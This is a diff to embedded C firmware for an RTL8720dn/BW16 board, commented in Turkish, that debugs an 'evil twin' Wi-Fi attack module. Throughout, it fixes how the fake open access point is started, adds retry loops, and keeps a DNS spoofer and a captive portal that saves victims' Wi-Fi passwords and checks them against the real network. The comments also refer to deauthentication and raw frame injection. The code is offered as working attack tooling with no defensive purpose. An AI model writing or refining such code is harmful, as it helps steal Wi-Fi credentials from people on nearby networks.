@@ -41,22 +41,24 @@ static uint8_t          et_rt_bssid[6] = {0};
 
 // ─── AP başlatma sarmalayıcısı ────────────────────────────────────────────────
 //
-// ARAŞTIRMA BULGUSU — Evil-BW16-WebUI, Ameba IoT forum, BW16-ESP32-Evil-Twin:
+// ARAŞTIRMA BULGUSU — delfyRTL (gorebrau/delfyRTL) kaynak kodu incelendi:
 //
-// AmebaD SDK'sı, WiFi.apbegin() öncesi STA arayüzünün TAMAMEN kapatılmasını
-// zorunlu kılar. WiFi.disconnect() çağrılmadan apbegin() çağrılırsa:
-//   - AP sessizce başarısız olur VEYA başlar ama beacon göndermez
-//   - Kurbanın tarama listesinde ağ görünmez
-//   - Bu, "deauth çalışıyor ama sahte AP görünmüyor" hatasının #1 sebebidir.
+// AmebaD SDK'sında WiFi.apbegin() için üç farklı overload bulunur:
+//   (A) apbegin(ssid, password, channel_str, hidden) → şifreli AP
+//   (B) apbegin(ssid, channel_str, hidden)           → AÇIK AP ← doğru form
+//   (C) apbegin(ssid, NULL, channel_str)             → sessizce başarısız!
+//   (D) apbegin(ssid, "", channel_str)               → sessizce başarısız!
 //
-// Referanslar:
-//   - Evil-BW16-WebUI (Evil-Project-Team/Evil-BW16-WebUI) startEvilTwin()
-//   - Ameba IoT forum: "WiFi.disconnect() before apbegin()"
-//   - BW16-ESP32-Evil-Twin (Janek79ax) setup sequence
+// (C) ve (D) formlarında AmebaD SDK içsel olarak WPA2 + boş parola deniyor,
+// beacon gönderilmiyor — ağ hiçbir cihazın tarama listesinde görünmüyor.
 //
-// Kanal:  AmebaD SDK imzası: WiFi.apbegin(ssid, password, channel_str)
-//         channel_str bir char* string — bu doğru; uint8_t değil.
-// Şifre:  Boş string ("") → AmebaD iç tarafında ENC_TYPE_NONE → açık ağ.
+// delfyRTL çözümü (RTL8720dn-firmware.ino satır ~85):
+//   status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
+//   → (uint8_t)0 = hidden=false parametresi; ap açık ve görünür olur.
+//
+// Ayrıca WiFi.enableConcurrent() setup'ta STA+AP eş zamanlı çalışması için şart.
+//
+// Kanal: char* string olarak geçilir ("6" gibi), uint8_t değil.
 static void et_ap_start(const String &ap_ssid, int channel) {
   char s[64];
   char c[4];
@@ -68,19 +70,33 @@ static void et_ap_start(const String &ap_ssid, int channel) {
   if (ch < 1 || ch > 13) ch = 6;
   snprintf(c, sizeof(c), "%d", ch);
 
-  // ── ADIM 1: STA arayüzünü tamamen kapat ──────────────────────────────────
-  // WiFi.disconnect() bağlantıyı keser; apbegin() mod geçişini kendisi halleder.
-  // Not: disableSTA() bazı AmebaD core sürümlerinde yoktur; disconnect() yeterlidir.
+  // ── ADIM 1: Mevcut WiFi durumunu temizle ─────────────────────────────────
+  // delfyRTL (gorebrau) referans projesinde de disconnect() kullanılıyor.
   WiFi.disconnect();
-  delay(300); // Radio settle — atlamak AP'nin başlamamasına yol açar
+  delay(250);
 
-  // ── ADIM 2: Sahte AP'yi başlat (açık ağ, şifresiz) ───────────────────────
-  WiFi.apbegin(s, (char *)"", c);
+  // ── ADIM 2: Açık AP başlat ────────────────────────────────────────────────
+  //
+  // KRITIK — AmebaD SDK'da üç farklı apbegin() overload'u vardır:
+  //   (A) apbegin(ssid, password, channel, hidden) → şifreli AP
+  //   (B) apbegin(ssid, channel, hidden)           → AÇIK AP ← doğru olan bu
+  //   (C) apbegin(ssid, NULL/""  , channel)        → sessizce başarısız olur!
+  //
+  // delfyRTL kaynak kodu (gorebrau/delfyRTL RTL8720dn-firmware.ino):
+  //   status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
+  //
+  // (uint8_t)0 = hidden=false → AP beacon göndererek görünür olur.
+  // Return değeri WL_CONNECTED olana kadar yeniden denenir.
+  //
+  int ap_status = WL_IDLE_STATUS;
+  for (int attempt = 0; attempt < 5 && ap_status != WL_CONNECTED; attempt++) {
+    ap_status = WiFi.apbegin(s, c, (uint8_t)0);
+    if (ap_status != WL_CONNECTED) delay(500);
+  }
 
   // ── ADIM 3: WLAN0 güç tasarrufunu kapat ──────────────────────────────────
   // AmebaD her WiFi.apbegin() çağrısında power-save'i yeniden etkinleştirir.
   // Bu, WLAN0'ın uyku moduna girmesine ve raw frame injection'ın durmasına yol açar.
-  // Her AP yeniden başlatmasından sonra bu çağrı zorunludur.
   wifi_disable_powersave();
 }
 
@@ -716,9 +732,14 @@ static void et_save_password(const String &password, bool verified) {
 static bool et_verify_password(const String &password) {
   // 1. DNS'i durdur
   if (et_dns_started) { et_dns_udp.stop(); et_dns_started = false; }
-  delay(200);
 
-  // 2. STA modunda bağlan
+  // 2. AP modunu kapat — AmebaD'de AP→STA geçişi için WiFi.disconnect() ZORUNLU.
+  //    Bu yapılmadan WiFi.begin() sessizce başarısız olur; bağlantı hiç kurulmaz.
+  //    Referans: Janek79ax/BW16-ESP32-Evil-Twin verifyPassword()
+  WiFi.disconnect();
+  delay(300);
+
+  // 3. STA modunda gerçek AP'ye bağlanmayı dene
   char et_ssid_buf[64];
   strncpy(et_ssid_buf, evil_twin_ssid.c_str(), sizeof(et_ssid_buf) - 1);
   et_ssid_buf[sizeof(et_ssid_buf) - 1] = '\0';
@@ -730,14 +751,16 @@ static bool et_verify_password(const String &password) {
     if (WiFi.status() == WL_CONNECTED) { ok = true; break; }
     delay(100);
   }
+
+  // 4. STA'yı kapat
   WiFi.disconnect();
-  delay(400); // Bağlantı kesme için süre
+  delay(300);
 
-  // 3. ET AP'yi yeniden başlat
+  // 5. ET AP'yi yeniden başlat (et_ap_start: disconnect+apbegin(ssid,ch,(uint8_t)0))
   et_ap_start(evil_twin_ssid, evil_twin_channel);
-  delay(500); // AP'nin hazır olması için yeterli süre
+  delay(400);
 
-  // 4. DNS'i yeniden başlat
+  // 6. DNS'i yeniden başlat
   et_dns_udp.begin(53);
   et_dns_started = true;
 
@@ -788,13 +811,13 @@ static void et_retrack() {
 
   // 2. Radyoyu serbest bırak
   WiFi.disconnect();
-  delay(200);
+  delay(100);
 
   // 3. Tara — radyo artık serbest, AP yok, scan çalışabilir
   et_rt_found   = false;
   et_rt_channel = 0;
   bool scan_ok = (wifi_scan_networks(et_retrack_handler, NULL) == RTW_SUCCESS);
-  if (scan_ok) delay(5000); // Taramanın tamamlanmasını bekle
+  if (scan_ok) delay(3000); // Taramanın tamamlanmasını bekle
 
   // 4. Kanal/BSSID değişikliği var mı?
   bool channel_changed = false;
@@ -806,9 +829,9 @@ static void et_retrack() {
     if (bssid_changed)   memcpy(evil_twin_bssid, et_rt_bssid, 6);
   }
 
-  // 5. AP'yi yeniden başlat (et_ap_start: disconnect+delay+apbegin)
+  // 5. AP'yi yeniden başlat (et_ap_start: disconnect+apbegin(ssid,ch,(uint8_t)0))
   et_ap_start(evil_twin_ssid, evil_twin_channel);
-  delay(500);
+  delay(400);
 
   // 6. DNS'i yeniden başlat
   et_dns_udp.begin(53);
@@ -934,7 +957,7 @@ void start_evil_twin(int /*scan_idx*/) {
 
   // ET AP'yi başlat
   et_ap_start(evil_twin_ssid, evil_twin_channel);
-  delay(500); // AP'nin tam hazır olması için yeterli süre
+  delay(400); // AP'nin tam hazır olması için yeterli süre
 
   // DNS spoofer başlat
   et_dns_udp.begin(53);
@@ -954,9 +977,19 @@ void stop_evil_twin() {
 
   // Yönetim AP'sini yeniden başlat.
   WiFi.disconnect();
-  delay(300);
-  { char c[] = "1"; WiFi.apbegin(ssid, pass, c); }
-  delay(500);
+  delay(250);
+  {
+    char c[] = "1";
+    int ap_status = WL_IDLE_STATUS;
+    for (int attempt = 0; attempt < 5 && ap_status != WL_CONNECTED; attempt++) {
+      ap_status = WiFi.apbegin(ssid, pass, c);
+      if (ap_status != WL_CONNECTED) delay(500);
+    }
+  }
+  delay(200);
+
+  // Concurrent modu yeniden etkinleştir (delfyRTL destroyAP() referans)
+  WiFi.enableConcurrent();
 
   // Yönetim AP yeniden başladıktan sonra power-save'i tekrar kapat.
   // AmebaD her apbegin() sonrasında power-save'i sıfırlar; WLAN0 injection için aktif kalmalı.
@@ -1080,7 +1113,7 @@ bool evil_twin_portal_handle(WiFiClient &client,
       et_save_password(password, true);
       et_last_verify_ok = true;
       portal_success(client);
-      delay(3000);
+      delay(1500);
       stop_evil_twin();
     } else {
       portal_serve(client, request, true);
